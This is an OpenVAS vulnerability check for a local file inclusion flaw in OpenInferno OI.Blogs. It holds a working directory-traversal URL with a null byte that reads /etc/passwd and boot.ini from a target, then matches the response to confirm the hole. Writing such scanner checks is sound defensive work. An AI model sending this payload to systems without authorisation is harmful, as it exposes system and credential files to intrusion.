###############################################################################
# OpenVAS Vulnerability Test
# $Id: OpenInferno_38402.nasl 5394 2017-02-22 09:22:42Z teissa $
#
# OpenInferno OI.Blogs Multiple Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "OpenInferno OI.Blogs is prone to multiple local file-include
vulnerabilities because it fails to properly sanitize user-
supplied input.

An attacker can exploit these vulnerabilities to obtain
potentially sensitive information and execute arbitrary local
scripts in the context of the webserver process. This may allow
the attacker to compromise the application and the computer; other
attacks are also possible.

OpenInferno OI.Blogs 1.0.0 is vulnerable; other versions may also
be affected.";


if (description)
{
 script_id(100508);
 script_version("$Revision: 5394 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-22 10:22:42 +0100 (Wed, 22 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-02-26 12:01:21 +0100 (Fri, 26 Feb 2010)");
 script_bugtraq_id(38402);
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_name("OpenInferno OI.Blogs Multiple Local File Include Vulnerabilities");


 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38402");
 script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/56505");
 script_xref(name : "URL" , value : "http://www.openinferno.com/page/OI-Blogs.html");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/blog","/oi",cgi_dirs());
files = make_list("etc/passwd","boot.ini");

foreach dir (dirs) {
   
  url = string(dir, "/index.php"); 
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
  if( buf == NULL )continue;

  if(egrep(pattern: "Powered By (OI.Blog|OpenInferno)", string: buf, icase: TRUE)) {
    foreach file (files) {
      
      url = string(dir, "/sources/javascript/loadScripts.php?scripts=/../../../../../../../../../../../../../../../", file,"%00");
      req = http_get(item:url, port:port);
      buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

      if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string: buf)) {

        security_message(port:port);
        exit(0);
      
      }
    }
  }
}

exit(0);
